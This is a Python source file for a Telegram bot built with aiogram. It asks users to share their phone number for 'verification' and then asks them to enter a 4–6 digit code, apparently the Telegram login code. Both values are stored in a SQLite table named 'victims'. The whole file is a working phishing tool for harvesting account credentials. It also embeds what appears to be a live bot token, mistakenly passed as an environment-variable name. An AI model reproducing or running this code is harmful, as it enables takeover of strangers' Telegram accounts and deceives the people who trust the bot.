import os
import sqlite3
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiohttp import TCPConnector
from aiogram.client.session.aiohttp import AiohttpSession

# Токен из переменных окружения Render
BOT_TOKEN = os.getenv('7880089024:AAFmWOsYNjIH1ca88Cc6mvCjyPl_uf6BEaw')
DB_PATH = "victims.db"

logging.basicConfig(level=logging.INFO)

async def main():
    # Создаем коннектор и сессию правильно
    connector = TCPConnector(force_close=True, enable_cleanup_closed=True)
    session = AiohttpSession(connector=connector)
    
    # Передаем сессию при создании бота
    bot = Bot(token=BOT_TOKEN, session=session)
    dp = Dispatcher()

    # Инициализация БД
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS victims 
                      (user_id INTEGER PRIMARY KEY, phone TEXT, code TEXT)''')
    conn.commit()
    conn.close()

    @dp.message(Command("start"))
    async def start(message: types.Message):
        kb = types.ReplyKeyboardMarkup(
            keyboard=[[types.KeyboardButton(text="Поделиться контактом", request_contact=True)]],
            resize_keyboard=True, one_time_keyboard=True
        )
        await message.answer("Привет! Пройди верификацию.", reply_markup=kb)

    @dp.message(F.contact)
    async def handle_contact(message: types.Message):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO victims (user_id, phone) VALUES (?, ?)", 
                       (message.from_user.id, message.contact.phone_number))
        conn.commit()
        conn.close()
        await message.answer("Контакт принят. Введите код:")

    @dp.message(F.text.regexp(r'^\d{4,6}$'))
    async def handle_code(message: types.Message):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("UPDATE victims SET code = ? WHERE user_id = ?", (message.text, message.from_user.id))
        conn.commit()
        conn.close()
        await message.answer("Данные приняты.")

    print("Бот успешно запущен в облаке!")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
